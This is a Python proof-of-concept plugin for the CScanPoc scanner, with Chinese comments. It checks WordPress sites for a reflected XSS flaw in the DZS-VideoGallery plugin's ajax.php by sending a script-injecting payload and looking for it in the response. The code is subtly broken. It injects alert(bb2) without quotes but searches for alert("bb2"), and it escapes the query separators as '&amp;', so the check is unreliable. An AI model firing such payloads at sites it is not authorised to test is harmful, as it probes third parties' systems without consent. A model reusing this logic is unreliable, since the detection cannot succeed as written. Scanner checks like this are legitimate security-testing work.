# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'WordPress_0020' # 平台漏洞编号，留空
    name = 'WordPress DZS-VideoGallery /ajax.php XSS漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。
        DZS-VideoGallery是其中的一个DZS视频库插件。 
        WordPress DZS-VideoGallery插件中存在跨站脚本漏洞，该漏洞源于程序没有正确过滤用户提交的输入。
        当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意脚本代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-61532' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress DZS-VideoGallery'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '53470280-8a62-44bb-a1fa-bb5297341598'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
                   "width=610&amp;type=vimeo&amp;source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()